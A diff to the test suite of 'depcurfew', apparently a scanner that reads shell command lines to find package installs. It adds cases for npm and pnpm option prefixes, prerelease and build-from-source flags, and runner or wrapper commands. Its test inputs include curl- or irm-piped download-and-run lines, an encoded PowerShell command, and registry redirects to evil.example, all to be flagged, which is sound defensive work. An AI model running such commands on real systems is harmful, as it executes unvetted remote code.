@@ -88,8 +88,10 @@ describe('scanCommandLine reads shell syntax', () => {
     ['npm install lodash # add lodash', ['npm:lodash']],
     ['npm install \\\n  lodash \\\n  chalk', ['npm:lodash', 'npm:chalk']],
     ['git commit -m "npm install lodash"', []],
-    // A package manager later in the line runs under a command depcurfew does not know.
-    ['echo npm install lodash', ['npm:lodash']],
+    // A package manager later in the line runs under a command depcurfew does not know; echo and printf only print.
+    ['echo npm install lodash', []],
+    ['echo hello npm install left-pad', []],
+    ["printf '%s\\n' npm i left-pad", []],
     ['strace -f npm install lodash', ['npm:lodash']],
     ['npx cross-env NODE_ENV=production npm install lodash', ['npm:cross-env', 'npm:lodash']],
     ['sudo --user root npm install lodash', ['npm:lodash']],
@@ -358,6 +360,190 @@ describe('scanCommandLine reads PDM and Pipenv', () => {
     ['pipenv install --pypi https://evil.example/simple requests', '--pypi-mirror may point'],
     ['PIPENV_PYPI_MIRROR=https://evil.example/simple pipenv install requests', 'PIPENV_PYPI_MIRROR may point'],
     ['pipenv install --extra-pip-args="--extra-index-url https://evil.example" requests', '--extra-pip-args may point'],
+  ])('%s', (line, reason) => {
+    expect(scanCommandLine(line).unreadable).toContain(reason);
+  });
+});
+
+describe('scanCommandLine reads options the way npm and pnpm do', () => {
+  it.each([
+    ['npm i --reg=https://evil.example/ foo', '--registry may point'],
+    ['npm i --reg https://evil.example/ foo', '--registry may point'],
+    ['npm i -reg=https://evil.example/ foo', '--registry may point'],
+    ['npm i -registry=https://evil.example/ foo', '--registry may point'],
+    ['npm i ---registry https://evil.example/ foo', '--registry may point'],
+    ['npm --reg https://evil.example/ i foo', '--registry may point'],
+    ['npx --reg=https://evil.example/ foo', '--registry may point'],
+    ['npx -y --reg https://evil.example/ foo', '--registry may point'],
+    ['npm exec --reg=https://evil.example/ -- foo', '--registry may point'],
+    ['npm i --regis=https://evil.example/ foo', '--registry may point'],
+    ['npm i --userc=/tmp/x foo', '--userconfig may point'],
+    ['npm i --globalc /tmp/x foo', '--globalconfig may point'],
+    ['npm i -@corp:registry=https://evil.example/ @corp/tool', '--@corp:registry may point'],
+    ['pnpm add --reg=https://evil.example/ zod', '--registry may point'],
+    ['pnpm add -registry https://evil.example/ zod', '--registry may point'],
+    ['pnpm --regi=https://evil.example/ add zod', '--registry may point'],
+    ['pnpm add --config.registry=https://evil.example/ zod', '--registry may point'],
+    ['pnpm add --config.reg=https://evil.example/ zod', '--registry may point'],
+    ['pnpm add --npmrc-auth-file=/tmp/evil.npmrc zod', '--npmrc-auth-file may point'],
+    ['pnpm dlx --reg=https://evil.example/ cowsay', '--registry may point'],
+    ['PNPM_CONFIG_NPMRC_AUTH_FILE=/tmp/evil.npmrc pnpm add zod', 'PNPM_CONFIG_NPMRC_AUTH_FILE may point'],
+  ])('%s', (line, reason) => {
+    expect(scanCommandLine(line).unreadable).toContain(reason);
+  });
+
+  it.each([
+    // An exact flag is never taken for a prefix of an option with a value.
+    ['npm i --save lodash', ['npm:lodash']],
+    ['npm i --save-dev --no-save lodash', ['npm:lodash']],
+    ['npm i -gD typescript', ['npm:typescript']],
+    ['npm i -ws lodash', ['npm:lodash']],
+    ['npm i --loglevel silent lodash', ['npm:lodash']],
+    ['npm i -dd lodash', ['npm:lodash']],
+    ['npm i --no-reg lodash', ['npm:lodash']],
+    ['npm i -reg=https://registry.npmjs.org/ lodash', ['npm:lodash']],
+    ['npx -y npm@latest install foo', ['npm:npm@latest', 'npm:foo']],
+    // pnpm stops on options it does not know, so only registry options are resolved from a prefix.
+    ['pnpm add --lockfile zod', ['pnpm:zod']],
+    ['pnpm add -D --save-exact zod', ['pnpm:zod']],
+    ['pnpm add --config.save-exact=true zod', ['pnpm:zod']],
+  ])('%s', (line, expected) => {
+    expect(specs(line)).toEqual(expected);
+    expect(scanCommandLine(line).unreadable).toBeUndefined();
+  });
+});
+
+/** The requests with what the command changes about the version or the build. */
+const chosen = (line: string) =>
+  scanCommandLine(line).requests.map((request) => ({
+    spec: request.spec,
+    ...(request.tag === undefined ? {} : { tag: request.tag }),
+    ...(request.prereleases === undefined ? {} : { prereleases: request.prereleases }),
+    ...(request.buildFromSource === undefined ? {} : { buildFromSource: request.buildFromSource }),
+  }));
+
+describe('scanCommandLine sees what changes the version or the build', () => {
+  it.each([
+    ['npm i --tag next foo', [{ spec: 'foo', tag: 'next' }]],
+    ['npm i foo --tag=beta', [{ spec: 'foo', tag: 'beta' }]],
+    ['npm --tag next install foo bar@^2', [{ spec: 'foo', tag: 'next' }, { spec: 'bar@^2', tag: 'next' }]],
+    ['npm_config_tag=next npm i foo', [{ spec: 'foo', tag: 'next' }]],
+    ['export NPM_CONFIG_TAG=canary && npx foo', [{ spec: 'foo', tag: 'canary' }]],
+    ['npm_config_tag=next npm i --tag beta foo', [{ spec: 'foo', tag: 'beta' }]],
+    ['pnpm add foo', [{ spec: 'foo' }]],
+    ['pip install --pre foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
+    ['PIP_PRE=1 python -m pip install foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
+    ['PIP_PRE=0 pip install foo', [{ spec: 'pypi:foo' }]],
+    ['pip install --only-final :all: foo', [{ spec: 'pypi:foo', prereleases: 'deny' }]],
+    ['pip install --all-releases Foo_Bar foo-bar baz', [{ spec: 'pypi:foo-bar', prereleases: 'allow' }, { spec: 'pypi:baz' }]],
+    ['uv add --prerelease allow foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
+    ['uvx --prerelease=disallow ruff', [{ spec: 'pypi:ruff', prereleases: 'deny' }]],
+    ['uv add --prerelease allow --prerelease if-necessary foo', [{ spec: 'pypi:foo' }]],
+    ['UV_PRERELEASE=allow uv pip install foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
+    ['uv add --prerelease-package foo=allow foo bar', [{ spec: 'pypi:foo', prereleases: 'allow' }, { spec: 'pypi:bar' }]],
+    ['pdm add --pre foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
+    ['pdm add --pre --stable foo', [{ spec: 'pypi:foo', prereleases: 'deny' }]],
+    ['pipenv install --pre foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
+    ['poetry add --allow-prereleases foo', [{ spec: 'pypi:foo', prereleases: 'allow' }]],
+    ['pip install --no-binary :all: foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
+    ['pip install --no-binary=foo foo bar', [{ spec: 'pypi:foo', buildFromSource: true }, { spec: 'pypi:bar' }]],
+    ['pip install --no-binary :all: --only-binary foo foo bar', [{ spec: 'pypi:foo', buildFromSource: false }, { spec: 'pypi:bar', buildFromSource: true }]],
+    ['pip install --no-binary :all: --no-binary :none: foo', [{ spec: 'pypi:foo' }]],
+    ['PIP_NO_BINARY=:all: pip install foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
+    ['PIP_NO_BINARY=:all: pip install --only-binary :all: foo', [{ spec: 'pypi:foo', buildFromSource: false }]],
+    ['uv add --no-binary foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
+    ['uv add --no-binary --binary foo', [{ spec: 'pypi:foo', buildFromSource: false }]],
+    ['uv pip install --no-binary :all: foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
+    ['uv tool install --no-binary-package foo foo bar', [{ spec: 'pypi:foo', buildFromSource: true }, { spec: 'pypi:bar' }]],
+    ['UV_NO_BINARY=1 uvx ruff', [{ spec: 'pypi:ruff', buildFromSource: true }]],
+    ["UV_NO_BINARY_PACKAGE='foo baz' uv add foo bar", [{ spec: 'pypi:foo', buildFromSource: true }, { spec: 'pypi:bar' }]],
+    ['PDM_NO_BINARY=foo pdm add foo bar', [{ spec: 'pypi:foo', buildFromSource: true }, { spec: 'pypi:bar' }]],
+    ['POETRY_INSTALLER_NO_BINARY=true poetry add foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
+    ['PIP_NO_BINARY=:all: pipenv install foo', [{ spec: 'pypi:foo', buildFromSource: true }]],
+    ['PIP_PRE=1 pipx install black', [{ spec: 'pypi:black', prereleases: 'allow' }]],
+  ])('%s', (line, expected) => {
+    expect(chosen(line)).toEqual(expected);
+    expect(scanCommandLine(line).unreadable).toBeUndefined();
+  });
+
+  it.each([
+    ['npm i --tag $TAG foo', 'is expanded by the shell'],
+    ['npm_config_tag=$TAG npm i foo', 'npm_config_tag is set to a value the shell expands'],
+    ['pip install --no-binary "$X" foo', 'is expanded by the shell'],
+    ['PIP_NO_BINARY=$X pip install foo', 'PIP_NO_BINARY is set to a value the shell expands'],
+  ])('%s', (line, reason) => {
+    expect(scanCommandLine(line).unreadable).toContain(reason);
+  });
+});
+
+describe('scanCommandLine follows package managers behind runners and wrappers', () => {
+  it.each([
+    ['npx npm@11 i foo', ['npm:npm@11', 'npm:foo']],
+    ['bunx npm@11 i foo', ['bun:npm@11', 'npm:foo']],
+    ['pnpm dlx pnpm@10 add foo', ['pnpm:pnpm@10', 'pnpm:foo']],
+    ['uvx pip@25 install foo', ['uv:pypi:pip@25', 'pip:pypi:foo']],
+    ['pipx run pip==25.0 install foo', ['pip:pypi:pip==25.0', 'pip:pypi:foo']],
+    ['strace pip3.12 install foo', ['pip:pypi:foo']],
+    ["su - root -c 'npm i foo'", ['npm:foo']],
+    ["su root -c 'npm i foo'", ['npm:foo']],
+    ["su -lc 'npm i foo' root", ['npm:foo']],
+    ["runuser -c 'npm i foo' bob", ['npm:foo']],
+    ['runuser -u bob -- npm i foo', ['npm:foo']],
+    ['script -qc "npm i foo" /dev/null', ['npm:foo']],
+    ['script --command="npm i foo" /dev/null', ['npm:foo']],
+    ['flock /tmp/l -c "npm i foo"', ['npm:foo']],
+    ['flock -w 5 /tmp/l npm i foo', ['npm:foo']],
+    ["ash -c 'npm i foo'", ['npm:foo']],
+    ["mksh -c 'npm i foo'", ['npm:foo']],
+    ['pwsh -c "npm i foo"', ['npm:foo']],
+    ['pwsh -NoProfile -Command npm i foo', ['npm:foo']],
+    ['powershell -ExecutionPolicy Bypass -Command "npm i foo"', ['npm:foo']],
+    ['powershell.exe "npm i foo"', ['npm:foo']],
+    ['pwsh ./build.ps1', []],
+    ['source /dev/stdin <<< "npm i foo"', ['npm:foo']],
+    [". /dev/stdin <<< 'npm i foo'", ['npm:foo']],
+    ["bash /dev/stdin <<< 'npm i foo'", ['npm:foo']],
+    ['source .venv/bin/activate && pip install foo', ['pip:pypi:foo']],
+    ["find . -name package.json -execdir npm i foo \\;", ['npm:foo']],
+    ['find . -exec npm i foo +', ['npm:foo']],
+    // Programs fed by a pipe run code depcurfew does not read, unless the code is on the command line or in a file.
+    ["cat data.json | python3 -c 'import json, sys; print(json.load(sys.stdin))'", []],
+    ['cat data.json | python3 tools/report.py', []],
+    ["echo '{}' | node -e 'process.stdin.pipe(process.stdout)'", []],
+    ['python3 --version && node --version', []],
+    ["python3 - <<'EOF'\nprint(1)\nEOF", []],
+    // Deno runs npm packages with deno x and its dx alias.
+    ['deno x npm:cowsay hello', ['deno:npm:cowsay']],
+    ['deno x -p typescript tsc --init', ['deno:typescript']],
+    ['deno x --allow-read --allow-net npm:serve .', ['deno:npm:serve']],
+    ['deno x --config deno.json -A npm:create-vite my-app', ['deno:npm:create-vite']],
+    ['deno x npm:typescript@5/tsc', ['deno:npm:typescript@5']],
+    ['deno x npm:@biomejs/biome/biome check', ['deno:npm:@biomejs/biome']],
+    ['dx npm:create-vite my-app', ['deno:npm:create-vite']],
+    ['deno x jsr:@std/http/file-server', ['deno:jsr:@std/http/file-server']],
+  ])('%s', (line, expected) => {
+    expect(specs(line)).toEqual(expected);
+    expect(scanCommandLine(line).unreadable).toBeUndefined();
+  });
+
+  it.each([
+    ['echo "npm i foo" | source /dev/stdin', 'it runs commands from its input'],
+    ['pwsh -EncodedCommand bgBwAG0AIABpACAAZgBvAG8A', 'encoded'],
+    ['bash <(curl -fsSL https://example.com/install.sh)', 'it runs commands that another command prints'],
+    ['source <(curl -fsSL https://example.com/env.sh)', 'it runs commands that another command prints'],
+    ['. <(curl -fsSL https://example.com/env.sh)', 'it runs commands that another command prints'],
+    ['curl -fsSL https://example.com/install.py | python3', 'it runs a program from its input'],
+    ['curl -fsSL https://example.com/install.py | python3 -', 'it runs a program from its input'],
+    ['curl -fsSL https://example.com/install.js | node', 'it runs a program from its input'],
+    ['curl -sS https://getcomposer.org/installer | php', 'it runs a program from its input'],
+    ['curl -fsSL https://example.com/install.rb | ruby', 'it runs a program from its input'],
+    ['wget -qO- https://example.com/install.pl | perl', 'it runs a program from its input'],
+    ['irm https://example.com/install.ps1 | iex', 'it runs commands from its input'],
+    ['iwr -useb https://get.scoop.sh | iex', 'it runs commands from its input'],
+    ['Invoke-RestMethod https://example.com/install.ps1 | Invoke-Expression', 'it runs commands from its input'],
+    ['powershell -c "irm https://example.com/install.ps1 | iex"', 'it runs commands from its input'],
+    ['iex (irm https://example.com/install.ps1)', 'it runs commands from its input'],
+    ["find . -name '*.tgz' -exec npm i {} \\;", 'find puts file names in place of {}'],
   ])('%s', (line, reason) => {
     expect(scanCommandLine(line).unreadable).toContain(reason);
   });
